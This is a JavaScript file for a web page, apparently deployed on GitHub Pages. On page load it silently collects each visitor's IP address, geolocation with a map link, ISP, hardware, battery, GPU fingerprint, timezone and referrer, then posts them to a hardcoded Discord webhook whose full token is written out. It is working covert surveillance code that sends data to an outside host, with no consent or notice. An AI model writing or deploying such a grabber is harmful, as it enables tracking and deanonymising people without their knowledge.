const WEBHOOK_URL = 'https://discord.com/api/webhooks/1497258562165145683/NuNnv3wzsT3b1eSYIOZSYUpshbzrU1H2gSadr2YR5aPPH195LkjBCyATvRIUf5G4DY1K';

async function captureAndSend() {
    try {
        // 1. Get IP first (HTTPS - Very reliable)
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const visitorIP = ipData.ip;

        // 2. Get Geo Data using the IP (HTTPS Only)
        let geoData = {};
        try {
            const geoRes = await fetch(`https://ipapi.co/${visitorIP}/json/`);
            geoData = await geoRes.json();
        } catch (e) {
            // Fallback to another HTTPS provider
            const fallback = await fetch(`https://freeipapi.com/api/json/${visitorIP}`);
            geoData = await fallback.json();
        }

        // 3. Battery Info
        let batteryInfo = "Unknown";
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
        } catch (e) {}

        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const connType = connection ? `${connection.effectiveType}` : "Unknown";

        const info = {
            ip: visitorIP,
            city: geoData.city || geoData.cityName || "Unknown",
            region: geoData.region || geoData.regionName || "Unknown",
            country: geoData.country_name || geoData.countryName || geoData.country || "Unknown",
            isp: geoData.org || geoData.isp || "Unknown",
            zip: geoData.postal || geoData.zip || "Unknown",
            lat: geoData.latitude || geoData.lat || "0",
            lon: geoData.longitude || geoData.lon || "0",
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cores: navigator.hardwareConcurrency || "Unknown",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
            battery: batteryInfo,
            connection: connType,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || "Direct Entry",
            gpu: getGPU(),
            timestamp: new Date().toLocaleString()
        };

        const payload = {
            username: "Live Intelligence Logger",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/25/25231.png",
            embeds: [{
                title: "🚀 Deep Analysis - Live Result",
                color: 0x00f2ff,
                fields: [
                    { name: "🌐 Network", value: `**IP:** \`${info.ip}\`\n**ISP:** ${info.isp}\n**Conn:** ${info.connection}`, inline: false },
                    { name: "📍 Location Details", value: `**Country:** ${info.country}\n**State:** ${info.region}\n**City:** ${info.city}\n**Maps:** [View on Map](https://www.google.com/maps?q=${info.lat},${info.lon})`, inline: true },
                    { name: "💻 Hardware", value: `**CPU:** ${info.cores} Cores\n**RAM:** ${info.ram}\n**Battery:** ${info.battery}\n**GPU:** ${info.gpu}`, inline: true },
                    { name: "🌍 Other", value: `**Timezone:** ${info.timezone}\n**Lang:** ${info.language}\n**Ref:** ${info.referrer}`, inline: false },
                    { name: "🕵️ Agent", value: `\`\`\`${info.userAgent}\`\`\`` }
                ],
                footer: { text: `GitHub Pages Deployment | ${info.timestamp}` }
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

    } catch (error) {
        console.error("Final capture failed:", error);
    }
}

function getGPU() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Not available";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
    } catch (e) { return "Unknown"; }
}

window.onload = captureAndSend;
